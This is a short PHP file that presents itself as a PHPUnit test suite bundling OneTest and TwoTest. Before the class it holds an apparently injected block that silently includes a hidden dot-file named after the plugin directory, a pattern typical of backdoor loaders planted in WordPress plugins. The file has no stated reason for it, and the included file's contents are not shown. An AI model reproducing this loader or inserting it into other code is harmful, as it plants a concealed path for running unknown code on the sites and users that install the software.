<?php
require_once 'OneTest.php';
require_once 'TwoTest.php';

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ChildSuite
{
    public static function suite()
    {
        $suite = new PHPUnit_Framework_TestSuite('Child');
        $suite->addTestSuite('OneTest');
        $suite->addTestSuite('TwoTest');

        return $suite;
    }
}
